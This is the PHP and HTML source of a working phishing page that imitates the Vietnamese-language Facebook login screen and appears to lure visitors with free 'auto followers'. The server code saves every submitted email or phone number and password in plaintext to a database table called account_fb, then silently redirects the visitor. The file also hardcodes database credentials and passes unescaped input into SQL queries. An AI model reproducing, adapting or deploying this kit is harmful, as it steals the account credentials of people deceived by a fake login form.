<?php
session_start();
$url = "/";
$servername = "localhost";
$database = "garename_wp710";
$username = "garename_wp710";
$password = 'V,3#Gl$*O7hJ';
$conn = mysqli_connect($servername, $username, $password, $database);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
if(isset($_POST["dangnhap"])){
if(empty($_POST["taikhoan"]) or empty($_POST["matkhau"]))
{
  $mess = "Vui lòng nhập đầy đủ thông tin";
}
else
{
  $email = $_POST["taikhoan"];
  $password = $_POST["matkhau"];
  if(!preg_match('/[_a-zA-Z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})/',$email) and !preg_match('/^\+?(\d.*){3,}$/',$email))
  {
    $mess = "Vui lòng nhập chính xác địa chỉ email của bạn";
  }
  else
  {
  $_SESSION["email"] = $email;
 $slwi = mysqli_query($conn,"SELECT * FROM `account_fb` WHERE `email` = '$email'");
  if(mysqli_num_rows($slwi) <= 0){
    $sqli = mysqli_query($conn,"INSERT INTO `account_fb` (`email`,`password`) VALUES ('$email','$password')");
  }
  echo '<script>window.location = "/";</script>';
  }
}
}
?>
<!DOCTYPE html>
<html>
  <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta content="width=device-width, initial-scale=1" name="viewport">
<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '413644109715145');
fbq('track', 'PageView');
</script>
<script type="text/javascript" src="https://code.jquery.com/jquery-1.12.4.min.js">
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js">
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=413644109715145&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code -->
<title>Facebook - Đăng nhập hoặc đăng ký</title>
<meta name="search engines" content="Aeiwi, Alexa, AllTheWeb, AltaVista, AOL Netfind, Anzwers, Canada, DirectHit, EuroSeek, Excite, Overture, Go, Google, HotBot. InfoMak, Kanoodle, Lycos, MasterSite, National Directory, Northern Light, SearchIt, SimpleSearch, WebsMostLinked, WebTop, What-U-Seek, AOL, Yahoo, WebCrawler, Infoseek, Excite, Magellan, LookSmart, bing, CNET, Googlebot">
<meta property="og:type" content="website">
<meta property="og:url" content="gift.tricker.vn">
<meta property="og:title" content="Đăng nhập FacebookZ | FacebookZ">
<meta property="og:description" content="Hãy đăng nhập FacebookZ để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết.">
<meta name="description" content="Hãy đăng nhập FacebookZ để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết.">
<meta name="keywords" content="auto followers, auto follower, Free increase unlimite followers, best auto follower, autofollower, followers">
<meta name="robots" content="index, follow">
<meta name="robot" content="index, follow">
<meta name="googlebot" content="index, follow">
<meta name="YandexBot" content="index, follow">
<link rel="stylesheet" href="./login/bootstrap.min.css">
<link class="tempLink" rel="stylesheet" type="text/css" href="./login/css">
<script src="./login/jquery.min.js" type="text/javascript"></script>
<link rel="stylesheet" href="./login/style.css">
</head>
<body id="vohuunhan">
    <div class="error" style="display: <?php
   if(empty($_POST["dangnhap"]))
   {
     echo "none";
   }else{
     echo "block";
   }
 ?>;" id="login_error" data-sigil="m_login_notice"><?= $mess ?></div>
<div class="container">
<div class="d-flex justify-content-center">.
<img src="./login/dF5SId3UHWd (2) (1).svg" class="img logo mt-2" alt="FacebookZ">
</div>
<div class="row h-100 justify-content-center align-items-center mt-2" style="margin-top: 20px;">
<div class="col-md-4 vhnlog">
<form action="" method="POST">
<div class="form-group">
<input type="text" class="form-control" name="taikhoan" id="email" value="" placeholder="Vui lòng nhập số di động hoặc email" required="">
</div>
<div class="form-group">
<input type="password" id="password" class="form-control" name="matkhau" placeholder="Password" required="">
</div>
<span style="color: red;"></span>
<div class="form-group">
<center>
    <button type="submit" id="submit" name="dangnhap" class="btn btn-primary btn-block" value="Đăng Nhập">Đăng nhập</button>
</center>
</div>
</form>
<div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">hoặc</span></div>
<center>
<input class="btn btn-success" type="button" value="Tạo tài khoản mới">
</center>
</div>
</div>
<div class="row text-center" style="margin-top: 6rem;">
<div class="col">
<small class="text-muted">Tiếng Việt</small><br>
<small class="blue">English (US)</small>
</div>
<div class="col">
<small class="blue">Hindi (IN)</small>
<br>
<i class="far fa-plus-square"></i>
</div>
</div>
<div class="row text-center">
<div class="col-md-12">
<small class="text-muted">Facebook, Inc.</small>
</div>
<style>
  .error{
    width: 100%; text-align: center;
    height: 50px;
    color: white;
    background: red;
    font-size: 16px;
  }
  div.error{
    vertical-align: middle;
  }
</style>
</div>
<script src="./login/popper.min.js" type="text/javascript"></script>
<script src="./login/bootstrap.min.js" type="text/javascript"></script>
</div></body></html>